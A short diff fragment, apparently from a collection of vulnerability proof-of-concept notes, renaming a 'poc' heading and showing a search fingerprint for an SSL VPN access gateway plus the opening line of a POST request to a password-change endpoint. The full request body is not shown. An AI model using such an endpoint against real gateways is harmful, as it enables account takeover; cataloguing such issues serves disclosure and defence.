@@ -8,7 +8,7 @@
 app="安全接入网关SecSSLVPN"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /changepass.php?type=2 HTTP/1.1
